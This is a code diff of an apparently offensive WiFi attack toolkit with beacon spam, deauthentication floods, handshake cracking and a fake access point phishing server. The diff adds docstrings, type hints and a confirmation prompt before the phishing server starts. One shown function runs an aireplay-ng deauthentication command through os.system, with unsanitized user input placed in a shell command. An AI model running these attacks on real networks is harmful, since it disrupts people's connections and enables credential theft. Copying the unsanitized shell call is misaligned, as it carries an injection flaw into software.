@@ -11,7 +11,8 @@ from rich.panel import Panel
 
 console = Console()
 
-def menu(interface):
+def menu(interface: str) -> None:
+    """Display the attacks menu and route to the selected attack module."""
     while True:
         console.print("\n[bold red]WiFi Attacks[/]")
         console.print("[cyan]1.[/] Beacon Spam")
@@ -38,8 +39,13 @@ def menu(interface):
             from modules.crack_handshake import crack_handshake
             crack_handshake()
         elif choice == "6":
-            from modules.fake_ap import start_fake_ap
-            start_fake_ap(interface)
+            # Add user confirmation before starting phishing server
+            confirm = Prompt.ask("[red]Are you sure you want to launch the Fake AP phishing server? (y/n)[/]", choices=["y","n"], default="n")
+            if confirm == "y":
+                from modules.fake_ap import start_fake_ap
+                start_fake_ap(interface)
+            else:
+                console.print("[yellow]Phishing attack cancelled.[/]")
         elif choice == "7":
             break
         else:
@@ -47,7 +53,8 @@ def menu(interface):
 
 
 
-def beacon_spam(interface):
+def beacon_spam(interface: str) -> None:
+    """Perform beacon spam attack with optional deauth and TX power boost."""
     from pathlib import Path
 
     # Define category paths
@@ -133,7 +140,8 @@ def beacon_spam(interface):
 
 
 
-def deauth_flood(interface):
+def deauth_flood(interface: str) -> None:
+    """Perform a deauthentication flood attack on a target AP or client."""
     from rich.panel import Panel
 
     console.print(Panel("[bold red]💥 Deauthentication Attack Setup[/]"))
@@ -168,7 +176,8 @@ def deauth_flood(interface):
 
 
 
-def targeted_deauth(interface):
+def targeted_deauth(interface: str) -> None:
+    """Perform a targeted deauthentication attack on a specific client and AP."""
     bssid = Prompt.ask("Enter BSSID (AP)")
     client = Prompt.ask("Enter Client MAC")
     os.system(f"sudo aireplay-ng --deauth 100 -a {bssid} -c {client} {interface}")
